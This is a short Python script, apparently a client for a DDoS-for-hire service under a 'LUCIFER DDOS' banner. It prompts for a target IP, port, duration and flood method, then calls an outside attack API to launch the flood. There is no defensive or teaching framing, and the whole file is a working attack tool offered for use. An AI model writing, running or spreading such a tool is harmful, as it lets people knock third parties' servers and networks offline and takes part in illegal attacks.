# please dont skid my code you can use my api key if you want

import os
import requests
import time
import threading

attack_running = False

def clear_console():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def print_title():
    title = r'''
██╗░░░░░██╗░░░██╗░█████╗░██╗███████╗███████╗██████╗░  ██████╗░██████╗░░█████╗░░██████╗
██║░░░░░██║░░░██║██╔══██╗██║██╔════╝██╔════╝██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░██║░░░██║██║░░╚═╝██║█████╗░░█████╗░░██████╔╝  ██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░░░░██║░░░██║██║░░██╗██║██╔══╝░░██╔══╝░░██╔══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
███████╗╚██████╔╝╚█████╔╝██║██║░░░░░███████╗██║░░██║  ██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝░╚═════╝░░╚════╝░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
'''
    print(title)

def stress_ip(host, port, time, method):
    global attack_running
    attack_running = True
    clear_console()
    print_title()
    url = f"https://api.lkxsecurity.su/attack?key=&host={host}&port={port}&time={time}&method={method}"
    response = requests.get(url)
    attack_running = False
    print("Attack sent")
    input("Press Enter to go back to the attack menu...")
    clear_console()
    print_title() # Print title again after attack is sent

def main():
    while True:
        print_title() # Print title at the main screen
        host = input("Enter the target IP address: ")
        port = int(input("Enter the target port: "))
        duration = int(input("Enter the duration of the attack (in seconds): "))
        method = input("Enter the attack method (e.g., UDP, TCP, etc.): ")

        stress_ip(host, port, duration, method)

        clear_console()

if __name__ == "__main__":
    main()
